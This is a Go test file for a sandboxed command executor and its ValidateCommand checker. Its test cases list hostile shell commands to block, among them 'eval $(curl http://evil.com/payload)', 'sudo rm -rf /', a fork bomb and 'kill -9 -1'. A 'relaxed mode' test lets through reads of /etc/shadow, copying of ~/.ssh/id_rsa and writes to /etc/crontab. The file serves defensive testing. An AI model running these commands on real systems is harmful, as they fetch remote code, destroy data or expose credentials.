package executor

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// ============================================================
// ValidateCommand 安全校验测试 (S1-S6, S14-S15)
// ============================================================

func TestValidateCommand_RelaxedPathAccess(t *testing.T) {
	// Direct mode: path traversal, absolute path read/write are now ALLOWED
	// (security is handled by sandbox working directory, not command validation)
	cases := []string{
		"cd ../../../etc && cat passwd",
		"cat ../../secret",
		"ls ..",
		"cat /etc/passwd",
		"head /etc/shadow",
		"tail /var/log/syslog",
		"cp /home/user/.ssh/id_rsa .",
		"less /etc/hosts",
		"echo hack > /etc/crontab",
		"echo data > /home/user/evil",
		"tee /var/tmp/payload",
	}
	for _, cmd := range cases {
		if err := ValidateCommand(cmd, "/sandbox/test"); err != nil {
			t.Errorf("FAIL: command should be allowed in relaxed mode: %q — %v", cmd, err)
		}
	}
}

func TestValidateCommand_DangerousSudo(t *testing.T) {
	// S4: sudo — 必须拒绝
	cases := []string{
		"sudo apt install xxx",
		"sudo rm -rf /",
		"sudo\tcat /etc/passwd",
	}
	for _, cmd := range cases {
		if err := ValidateCommand(cmd, "/sandbox/test"); err == nil {
			t.Errorf("S4 FAIL: sudo not blocked: %q", cmd)
		}
	}
}

func TestValidateCommand_DangerousRmRf(t *testing.T) {
	// S5: rm -rf / — 必须拒绝
	cases := []string{
		"rm -rf /",
		"rm -rf /*",
	}
	for _, cmd := range cases {
		if err := ValidateCommand(cmd, "/sandbox/test"); err == nil {
			t.Errorf("S5 FAIL: rm -rf not blocked: %q", cmd)
		}
	}
}

func TestValidateCommand_DdAllowed(t *testing.T) {
	// dd is now allowed (Direct mode: full access, Docker mode: container isolation)
	cases := []string{
		"dd if=/dev/zero of=output bs=1M count=1",
		"dd if=input.bin of=output.bin",
	}
	for _, cmd := range cases {
		if err := ValidateCommand(cmd, "/sandbox/test"); err != nil {
			t.Errorf("FAIL: dd should be allowed: %q — %v", cmd, err)
		}
	}
}

func TestValidateCommand_SymlinkAllowed(t *testing.T) {
	// Symlinks are now allowed (sandbox working directory provides isolation)
	cases := []string{
		"ln -s /etc/passwd link",
		"ln -s file1 file2",
	}
	for _, cmd := range cases {
		if err := ValidateCommand(cmd, "/sandbox/test"); err != nil {
			t.Errorf("FAIL: symlink should be allowed: %q — %v", cmd, err)
		}
	}
}

func TestValidateCommand_PipeAllowed(t *testing.T) {
	// Pipes with absolute paths are now allowed
	cases := []string{
		"echo a | cat /etc/passwd",
		"ls | head /etc/shadow",
		"curl https://example.com | sed 's/<[^>]*>//g'",
	}
	for _, cmd := range cases {
		if err := ValidateCommand(cmd, "/sandbox/test"); err != nil {
			t.Errorf("FAIL: pipe command should be allowed: %q — %v", cmd, err)
		}
	}
}

func TestValidateCommand_ChainedDangerousCommands(t *testing.T) {
	// 链式命令中的危险操作 — 只检测 blockedPrefixes
	cases := []string{
		"echo hi; sudo rm -rf /",
		"ls && sudo apt install malware",
		"echo ok || shutdown -h now",
		"true | sudo cat /etc/shadow",
	}
	for _, cmd := range cases {
		if err := ValidateCommand(cmd, "/sandbox/test"); err == nil {
			t.Errorf("FAIL: chained dangerous command not blocked: %q", cmd)
		}
	}
}

func TestValidateCommand_SystemCommands(t *testing.T) {
	// 系统管理命令 — 必须拒绝
	cases := []string{
		"shutdown -h now",
		"reboot",
		"halt",
		"poweroff",
		"mkfs.ext4 /dev/sda1",
		"fdisk /dev/sda",
		"mount /dev/sda1 /mnt",
		"umount /mnt",
		"iptables -F",
		"systemctl stop sshd",
		"service nginx stop",
	}
	for _, cmd := range cases {
		if err := ValidateCommand(cmd, "/sandbox/test"); err == nil {
			t.Errorf("FAIL: system command not blocked: %q", cmd)
		}
	}
}

func TestValidateCommand_DeviceAccess(t *testing.T) {
	// /dev/ 读写 — 必须拒绝
	cases := []string{
		"> /dev/sda",
		"< /dev/random",
	}
	for _, cmd := range cases {
		if err := ValidateCommand(cmd, "/sandbox/test"); err == nil {
			t.Errorf("FAIL: device access not blocked: %q", cmd)
		}
	}
}

func TestValidateCommand_EvalExec(t *testing.T) {
	// eval/exec — 必须拒绝
	cases := []string{
		"eval $(curl http://evil.com/payload)",
		"exec /bin/sh",
	}
	for _, cmd := range cases {
		if err := ValidateCommand(cmd, "/sandbox/test"); err == nil {
			t.Errorf("FAIL: eval/exec not blocked: %q", cmd)
		}
	}
}

func TestValidateCommand_ForkBomb(t *testing.T) {
	if err := ValidateCommand(":(){ :|:& };:", "/sandbox/test"); err == nil {
		t.Error("FAIL: fork bomb not blocked")
	}
}

func TestValidateCommand_KillInit(t *testing.T) {
	cases := []string{
		"kill -9 1",
		"kill -9 -1",
	}
	for _, cmd := range cases {
		if err := ValidateCommand(cmd, "/sandbox/test"); err == nil {
			t.Errorf("FAIL: kill init not blocked: %q", cmd)
		}
	}
}

func TestValidateCommand_EmptyCommand(t *testing.T) {
	if err := ValidateCommand("", "/sandbox/test"); err == nil {
		t.Error("FAIL: empty command should be rejected")
	}
	if err := ValidateCommand("   ", "/sandbox/test"); err == nil {
		t.Error("FAIL: whitespace-only command should be rejected")
	}
}

// ============================================================
// ValidateCommand 合法命令测试 (S10-S13)
// ============================================================

func TestValidateCommand_LegitimateCommands(t *testing.T) {
	// S10-S13: 合法命令 — 必须通过
	cases := []string{
		"echo hello",
		"ls -la",
		"pwd",
		"node -e \"console.log(1+1)\"",
		"python3 -c \"print(1+1)\"",
		"npx --version",
		"npm install express",
		"pip install requests",
		"uv run script.py",
		"curl https://example.com",
		"git clone https://github.com/user/repo.git",
		"cat file.txt",
		"head -5 output.log",
		"mkdir -p src/components",
		"touch newfile.js",
		"cp a.txt b.txt",
		"mv old.js new.js",
		"rm temp.txt",
		"rm -rf node_modules",
	}
	for _, cmd := range cases {
		if err := ValidateCommand(cmd, "/sandbox/test"); err != nil {
			t.Errorf("FAIL: legitimate command blocked: %q — %v", cmd, err)
		}
	}
}

func TestValidateCommand_AllowedAbsolutePaths(t *testing.T) {
	// 允许访问 /usr, /bin, /opt, /tmp
	cases := []string{
		"cat /usr/local/bin/node",
		"ls /bin/sh",
		"head /tmp/test.log",
	}
	for _, cmd := range cases {
		if err := ValidateCommand(cmd, "/sandbox/test"); err != nil {
			t.Errorf("FAIL: allowed absolute path blocked: %q — %v", cmd, err)
		}
	}
}

func TestValidateCommand_DevNull(t *testing.T) {
	// 重定向到 /dev/null 应该允许
	if err := ValidateCommand("echo test > /dev/null", "/sandbox/test"); err != nil {
		t.Errorf("FAIL: redirect to /dev/null blocked: %v", err)
	}
}

// ============================================================
// ExecuteInSandbox 运行时测试 (S7-S9, S10-S13)
// ============================================================

func TestExecuteInSandbox_Echo(t *testing.T) {
	// S10: echo hello → "hello"
	sandbox, err := CreateSandbox(t.TempDir(), "test-echo")
	if err != nil {
		t.Fatalf("CreateSandbox failed: %v", err)
	}
	defer CleanupSandbox(sandbox)

	output, err := ExecuteInSandbox(context.Background(), sandbox, "echo hello", 10)
	if err != nil {
		t.Fatalf("S10 FAIL: echo failed: %v", err)
	}
	if strings.TrimSpace(output) != "hello" {
		t.Errorf("S10 FAIL: expected 'hello', got %q", output)
	}
}

func TestExecuteInSandbox_HomeIsolation(t *testing.T) {
	// S8: $HOME 应该返回沙箱路径
	sandbox, err := CreateSandbox(t.TempDir(), "test-home")
	if err != nil {
		t.Fatalf("CreateSandbox failed: %v", err)
	}
	defer CleanupSandbox(sandbox)

	output, err := ExecuteInSandbox(context.Background(), sandbox, "echo $HOME", 10)
	if err != nil {
		t.Fatalf("S8 FAIL: echo $HOME failed: %v", err)
	}
	if strings.TrimSpace(output) != sandbox {
		t.Errorf("S8 FAIL: HOME should be %q, got %q", sandbox, output)
	}
}

func TestExecuteInSandbox_Timeout(t *testing.T) {
	// S7: 超时杀死 — sleep 999 with 2s timeout
	sandbox, err := CreateSandbox(t.TempDir(), "test-timeout")
	if err != nil {
		t.Fatalf("CreateSandbox failed: %v", err)
	}
	defer CleanupSandbox(sandbox)

	_, err = ExecuteInSandbox(context.Background(), sandbox, "sleep 999", 2)
	if err == nil {
		t.Fatal("S7 FAIL: sleep 999 should have timed out")
	}
	if !strings.Contains(err.Error(), "timed out") {
		t.Errorf("S7 FAIL: expected timeout error, got: %v", err)
	}
}

func TestExecuteInSandbox_OutputTruncation(t *testing.T) {
	// S9: 输出截断 — 超过 1MB 的输出应被截断
	sandbox, err := CreateSandbox(t.TempDir(), "test-trunc")
	if err != nil {
		t.Fatalf("CreateSandbox failed: %v", err)
	}
	defer CleanupSandbox(sandbox)

	// Generate 2MB of output
	output, err := ExecuteInSandbox(context.Background(), sandbox, "yes | head -c 2000000", 30)
	if err != nil {
		// Command may fail due to broken pipe, that's ok
		// Just check output size
	}
	_ = err
	if len(output) > MaxOutputBytes+1024 { // small buffer for stderr
		t.Errorf("S9 FAIL: output too large: %d bytes (max %d)", len(output), MaxOutputBytes)
	}
}

func TestExecuteInSandbox_WorkingDirectory(t *testing.T) {
	// 工作目录应该是沙箱路径 (macOS: /var → /private/var symlink)
	sandbox, err := CreateSandbox(t.TempDir(), "test-pwd")
	if err != nil {
		t.Fatalf("CreateSandbox failed: %v", err)
	}
	defer CleanupSandbox(sandbox)

	output, err := ExecuteInSandbox(context.Background(), sandbox, "pwd", 10)
	if err != nil {
		t.Fatalf("pwd failed: %v", err)
	}
	// Resolve symlinks for comparison (macOS /var → /private/var)
	realSandbox, _ := filepath.EvalSymlinks(sandbox)
	got := strings.TrimSpace(output)
	if got != sandbox && got != realSandbox {
		t.Errorf("working dir should be %q, got %q", sandbox, got)
	}
}

func TestExecuteInSandbox_FileCreation(t *testing.T) {
	// 沙箱内可以创建和读取文件
	sandbox, err := CreateSandbox(t.TempDir(), "test-file")
	if err != nil {
		t.Fatalf("CreateSandbox failed: %v", err)
	}
	defer CleanupSandbox(sandbox)

	output, err := ExecuteInSandbox(context.Background(), sandbox, "echo 'test content' > myfile.txt && cat myfile.txt", 10)
	if err != nil {
		t.Fatalf("file ops failed: %v", err)
	}
	if !strings.Contains(output, "test content") {
		t.Errorf("expected 'test content' in output, got %q", output)
	}
}

func TestExecuteInSandbox_TmpDir(t *testing.T) {
	// TMPDIR 应该指向沙箱内的 tmp/
	sandbox, err := CreateSandbox(t.TempDir(), "test-tmp")
	if err != nil {
		t.Fatalf("CreateSandbox failed: %v", err)
	}
	defer CleanupSandbox(sandbox)

	output, err := ExecuteInSandbox(context.Background(), sandbox, "echo $TMPDIR", 10)
	if err != nil {
		t.Fatalf("echo TMPDIR failed: %v", err)
	}
	expected := sandbox + "/tmp"
	if strings.TrimSpace(output) != expected {
		t.Errorf("TMPDIR should be %q, got %q", expected, output)
	}
}

func TestExecuteInSandbox_FailedCommand(t *testing.T) {
	// 失败的命令应返回错误
	sandbox, err := CreateSandbox(t.TempDir(), "test-fail")
	if err != nil {
		t.Fatalf("CreateSandbox failed: %v", err)
	}
	defer CleanupSandbox(sandbox)

	_, err = ExecuteInSandbox(context.Background(), sandbox, "exit 1", 10)
	if err == nil {
		t.Error("exit 1 should return error")
	}
}

func TestExecuteInSandbox_StderrCapture(t *testing.T) {
	// stderr 应被捕获
	sandbox, err := CreateSandbox(t.TempDir(), "test-stderr")
	if err != nil {
		t.Fatalf("CreateSandbox failed: %v", err)
	}
	defer CleanupSandbox(sandbox)

	output, _ := ExecuteInSandbox(context.Background(), sandbox, "echo error_msg >&2", 10)
	if !strings.Contains(output, "error_msg") {
		t.Errorf("stderr not captured, got %q", output)
	}
}

// ============================================================
// CreateSandbox / CleanupSandbox 测试
// ============================================================

func TestCreateSandbox(t *testing.T) {
	tmpDir := t.TempDir()
	sandbox, err := CreateSandbox(tmpDir, "card-123")
	if err != nil {
		t.Fatalf("CreateSandbox failed: %v", err)
	}

	// 验证路径正确
	expected := tmpDir + "/sandbox/card-123"
	if sandbox != expected {
		t.Errorf("sandbox path: expected %q, got %q", expected, sandbox)
	}

	// 验证目录和 tmp 子目录存在
	if _, err := execStatCheck(sandbox); err != nil {
		t.Errorf("sandbox dir not created")
	}
	if _, err := execStatCheck(sandbox + "/tmp"); err != nil {
		t.Errorf("sandbox tmp dir not created")
	}
}

func TestCleanupSandbox_Safety(t *testing.T) {
	// CleanupSandbox 不应删除非沙箱路径
	CleanupSandbox("") // should not panic
	CleanupSandbox("/home/user") // should not delete (no /sandbox/)
	CleanupSandbox("/tmp/random") // should not delete (no /sandbox/)
}

func TestCleanupSandbox_Works(t *testing.T) {
	tmpDir := t.TempDir()
	sandbox, err := CreateSandbox(tmpDir, "card-cleanup")
	if err != nil {
		t.Fatalf("CreateSandbox failed: %v", err)
	}

	// 创建一些文件
	ExecuteInSandbox(context.Background(), sandbox, "echo test > file.txt", 10)

	// 清理
	CleanupSandbox(sandbox)

	// 验证已删除
	if _, err := execStatCheck(sandbox); err == nil {
		t.Error("sandbox should have been removed after cleanup")
	}
}

// ============================================================
// limitedWriter 测试
// ============================================================

func TestLimitedWriter(t *testing.T) {
	var buf strings.Builder
	lw := &limitedWriter{w: &buf, limit: 10}

	// 写入 5 字节
	n, err := lw.Write([]byte("hello"))
	if err != nil || n != 5 {
		t.Errorf("first write: n=%d, err=%v", n, err)
	}

	// 再写入 10 字节 — 只应接受 5
	n, err = lw.Write([]byte("worldworld"))
	if err != nil {
		t.Errorf("second write err: %v", err)
	}
	// n reports full len but buffer only has 10 bytes
	if buf.Len() != 10 {
		t.Errorf("buffer should be 10 bytes, got %d", buf.Len())
	}

	// 超过 limit 后的写入应被丢弃
	n, err = lw.Write([]byte("more"))
	if err != nil {
		t.Errorf("overflow write err: %v", err)
	}
	if buf.Len() != 10 {
		t.Errorf("buffer should still be 10 bytes after overflow, got %d", buf.Len())
	}
}

// ============================================================
// DirectExecutor 接口测试
// ============================================================

func TestDirectExecutor_ImplementsInterface(t *testing.T) {
	var _ Executor = NewDirectExecutor("") // compile-time check
}

func TestDirectExecutor_CreateSandboxSharedPackages(t *testing.T) {
	tmpDir := t.TempDir()
	exec := NewDirectExecutor(tmpDir)

	sandbox, err := exec.CreateSandbox(SandboxConfig{
		HomeDir: tmpDir,
		CardID:  "card-456",
	})
	if err != nil {
		t.Fatalf("CreateSandbox failed: %v", err)
	}
	defer exec.Cleanup(sandbox)

	// Verify sandbox path
	expected := filepath.Join(tmpDir, "sandbox", "card-456")
	if sandbox != expected {
		t.Errorf("sandbox path: expected %q, got %q", expected, sandbox)
	}

	// Verify shared packages directory was created
	pkgDir := filepath.Join(tmpDir, "packages")
	for _, sub := range []string{".local/bin", "node_modules/.bin", ".pip"} {
		path := filepath.Join(pkgDir, sub)
		if _, err := os.Stat(path); err != nil {
			t.Errorf("packages directory not created: %s", path)
		}
	}
}

func TestDirectExecutor_ExecuteWithSharedPATH(t *testing.T) {
	tmpDir := t.TempDir()
	exec := NewDirectExecutor(tmpDir)

	sandbox, err := exec.CreateSandbox(SandboxConfig{
		HomeDir: tmpDir,
		CardID:  "card-path",
	})
	if err != nil {
		t.Fatalf("CreateSandbox failed: %v", err)
	}
	defer exec.Cleanup(sandbox)

	// Create a fake tool in shared packages .local/bin
	pkgBin := filepath.Join(tmpDir, "packages", ".local", "bin")
	os.MkdirAll(pkgBin, 0755)
	toolPath := filepath.Join(pkgBin, "mytool")
	os.WriteFile(toolPath, []byte("#!/bin/sh\necho shared-tool-works"), 0755)

	// Tool should be found via PATH
	output, err := exec.Execute(context.Background(), sandbox, "", "mytool", 10)
	if err != nil {
		t.Fatalf("Execute with shared PATH failed: %v", err)
	}
	if strings.TrimSpace(output) != "shared-tool-works" {
		t.Errorf("expected 'shared-tool-works', got %q", output)
	}
}

func TestDirectExecutor_ExecuteBasic(t *testing.T) {
	tmpDir := t.TempDir()
	exec := NewDirectExecutor(tmpDir)

	sandbox, err := exec.CreateSandbox(SandboxConfig{
		HomeDir: tmpDir,
		CardID:  "card-basic",
	})
	if err != nil {
		t.Fatalf("CreateSandbox failed: %v", err)
	}
	defer exec.Cleanup(sandbox)

	output, err := exec.Execute(context.Background(), sandbox, "", "echo hello", 10)
	if err != nil {
		t.Fatalf("Execute failed: %v", err)
	}
	if strings.TrimSpace(output) != "hello" {
		t.Errorf("expected 'hello', got %q", output)
	}
}

func TestDirectExecutor_PipTargetPointsToPackages(t *testing.T) {
	tmpDir := t.TempDir()
	exec := NewDirectExecutor(tmpDir)

	sandbox, err := exec.CreateSandbox(SandboxConfig{
		HomeDir: tmpDir,
		CardID:  "card-pip",
	})
	if err != nil {
		t.Fatalf("CreateSandbox failed: %v", err)
	}
	defer exec.Cleanup(sandbox)

	// PIP_TARGET should point to shared packages directory
	output, err := exec.Execute(context.Background(), sandbox, "", "echo $PIP_TARGET", 10)
	if err != nil {
		t.Fatalf("echo PIP_TARGET failed: %v", err)
	}
	expected := filepath.Join(tmpDir, "packages", ".pip")
	if strings.TrimSpace(output) != expected {
		t.Errorf("PIP_TARGET should be %q, got %q", expected, output)
	}
}

// helper: check if path exists using os.Stat
func execStatCheck(path string) (bool, error) {
	_, err := os.Stat(path)
	return err == nil, err
}
